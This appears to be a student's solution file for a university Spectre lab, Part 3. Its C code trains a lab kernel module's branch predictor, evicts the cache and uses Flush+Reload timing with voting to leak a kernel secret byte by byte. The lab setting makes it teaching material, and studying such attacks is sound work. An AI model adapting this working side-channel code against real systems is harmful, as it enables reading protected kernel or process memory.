/*
 * Exploiting Speculative Execution
 *
 * Part 3
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <immintrin.h>

#include "labspectre.h"
#include "labspectreipc.h"

#define THRESHOLD_SAMPLES 1000
#define THRESHOLD_MARGIN 50
#define PAGE_SIZE 4096
#define NUM_SLOTS 256
#define TRIALS 40 
#define TRAIN_PER_ATTACK 20 
#define EVICT_SIZE (11 * 1024 * 1024)

uint8_t *evict_buf;

/*
 * call_kernel_part3
 * Performs the COMMAND_PART3 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
*/
static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}


static uint64_t calibrate_threshold() {
    volatile char buf[PAGE_SIZE * 2];
    uint64_t hit_total = 0, miss_total = 0;

    for (int i = 0; i < PAGE_SIZE * 2; i++) buf[i] = 1;

    for (int i = 0; i < THRESHOLD_SAMPLES; i++) {
        // Measure cache hit
        (void)buf[0];
        _mm_mfence();
        hit_total += time_access((void *)&buf[0]);

        // Measure cache miss
	clflush((void *)&buf[PAGE_SIZE]);
        _mm_mfence();
        miss_total += time_access((void *)&buf[PAGE_SIZE]);
    }

    uint64_t avg_hit = hit_total / THRESHOLD_SAMPLES;
    uint64_t avg_miss = miss_total / THRESHOLD_SAMPLES;

    uint64_t midpoint = avg_hit + (avg_miss - avg_hit) / 2;
    uint64_t floor = avg_hit + THRESHOLD_MARGIN;

    return (midpoint > floor) ? midpoint : floor;
}


void init_evict_buf() {
  // Allocates the eviction buffer for flushing the L3 cache.
  evict_buf = malloc(EVICT_SIZE);

  // Touch each page.
  for (size_t i = 0; i < EVICT_SIZE; i += 4096) {
    evict_buf[i] = 1;
  }
}


static void flush_probe_array(uint8_t *base) {
    // Flushes all 256 page spaced probe slots from the cache.
    for (int i = 0; i < 256; i++) {
        clflush(base + (i * 4096));
    }
    // Call _mm_mfence to make sure cache is flushed before function finishes.
    _mm_mfence();
}


static void evict_cache() {
    // Forcibly evicts the L3 cache by accessing evict_buf.
    for (int a = 0; a < 4; a++) {
        for (size_t i = 0; i < EVICT_SIZE; i += 4096) {
            evict_buf[i] ^= 1;
        }
    }
}

static int reload_and_find_hit(char *shared_memory, uint64_t thresh) {
    // Returns index of probe slot with fastest return time.
    int best_index = -1;
    uint64_t best_time = thresh;

    // Check all slots and see which has shortest time access. 
    for (int i = 0; i < NUM_SLOTS; i++) {
        int idx = (i * 167 + 13) & 0xFF;
        volatile char *slot = (volatile char *)&shared_memory[idx * PAGE_SIZE];

        uint64_t t = time_access((void *)slot);

        if (t < best_time) {
            best_time  = t;
            best_index = idx;
        }
    }
    return best_index;
}


static unsigned char leak_byte(int kernel_fd, char *shared_memory, size_t offset) {
    // Leak byte of kernel secret at given offset.
    int votes[NUM_SLOTS] = {0};
    
    // Calculate cache hit/miss threshold
    uint64_t threshold= calibrate_threshold();

    // Run many trials to reduce noise
    for (int t = 0; t < TRIALS; t++) {
	// Train
	for (int i  = 0; i < TRAIN_PER_ATTACK - 2; i++) {
	    call_kernel_part3(kernel_fd, shared_memory, 0);
	}
	call_kernel_part3(kernel_fd, shared_memory, 0);
	call_kernel_part3(kernel_fd, shared_memory, 0);

    flush_probe_array(shared_memory);
    _mm_mfence();

	// Evict 
	evict_cache();

/*	// Flush
	flush_probe_array(shared_memory);
	_mm_mfence();
*/
	// Attack
    	call_kernel_part3(kernel_fd, shared_memory, offset);

	// Reload
    	int hit = reload_and_find_hit(shared_memory, threshold);
	if (hit >= 0) {
		votes[hit]++;
	}
    }

    // Return slot index with the highest number of votes.
    int best_val = 0;
    for (int i = 1; i < NUM_SLOTS; i++) {
        if (votes[i] > votes[best_val]) {
            best_val = i;
        }
    }
    return (unsigned char)best_val;
}


/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
*/
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    init_evict_buf();

    for (int i = 0; i < 256; i++) {
        shared_memory[i * PAGE_SIZE] = 0;
    }
    _mm_mfence();

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        unsigned char leaked_byte = leak_byte(kernel_fd, shared_memory, current_offset);


	printf("offset %zu -> 0x%02x ('%c')\n", current_offset, leaked_byte, (leaked_byte >= 0x20 && leaked_byte < 0x7f) ? leaked_byte : '?');


        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
